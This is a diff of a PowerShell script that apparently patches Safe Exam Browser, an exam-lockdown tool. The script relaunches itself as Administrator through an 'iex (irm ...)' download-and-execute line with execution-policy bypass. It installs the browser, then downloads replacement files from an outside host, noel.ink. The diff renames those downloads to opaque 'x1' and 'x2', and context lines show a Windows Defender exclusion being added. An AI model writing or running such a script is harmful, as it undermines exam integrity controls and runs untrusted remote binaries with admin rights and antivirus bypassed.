@@ -3,7 +3,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Write-Host "Script is not running as Administrator. Relaunching with elevated privileges..." -ForegroundColor Yellow
     $scriptUrl = "https://noel.ink/safe-exam"
     # Build the argument string so that the new elevated process downloads & runs this same script.
-    $arguments = '-NoProfile -ExecutionPolicy Bypass -Command "irm ''{0}'' | iex" -f "' + $scriptUrl + '"'
+    $arguments = '-NoProfile -ExecutionPolicy Bypass -Command "iex (irm ''{0}'')" -f "' + $scriptUrl + '"'
     Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs
     exit
 }
@@ -11,7 +11,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 Write-Host "Running with Administrator privileges." -ForegroundColor Green
 
 # 1. Install SafeExamBrowser via winget.
-Write-Host "Updating SafeExamBrowser via winget..." -ForegroundColor Cyan
+Write-Host "Installing SafeExamBrowser via winget..." -ForegroundColor Cyan
 try {
     winget install --id=ETHZurich.SafeExamBrowser -e --disable-interactivity --force --accept-source-agreements --accept-package-agreements
 }
@@ -28,13 +28,8 @@ if (-Not (Test-Path $downloadFolder)) {
 
 # Define the file identifiers and their source URLs.
 $filesToDownload = @{
-    "SafeExamBrowser.Client.exe" = "https://noel.ink/safe-exam/SafeExamBrowser.Client.exe"
-    "SafeExamBrowser.Configuration.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.Configuration.dll"
-    "SafeExamBrowser.Monitoring.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.Monitoring.dll"
-    "SafeExamBrowser.UserInterface.Desktop.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.UserInterface.Desktop.dll"
-    "SafeExamBrowser.UserInterface.Shared.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.UserInterface.Shared.dll"
-    "SafeExamBrowser.WindowsApi.dll" = "https://noel.ink/safe-exam/SafeExamBrowser.WindowsApi.dll"
-    "SafeExamBrowser.exe" = "https://noel.ink/safe-exam/SafeExamBrowser.exe"
+    "x1" = "https://noel.ink/x1"
+    "x2" = "https://noel.ink/x2"
 }
 
 foreach ($name in $filesToDownload.Keys) {
@@ -80,5 +75,12 @@ catch {
     Write-Warning "Could not add Windows Defender exclusion. You may need to add it manually."
 }
 
+# Clear all previous outputs.
 Clear-Host
-Write-Host "Happy exams!" -ForegroundColor Green
+
+# Final message.
+Write-Host "Patch applied successfully y'all" -ForegroundColor Green
+
+# Wait for user input before closing.
+Write-Host "`nPress Enter to exit..."
+[void](Read-Host)
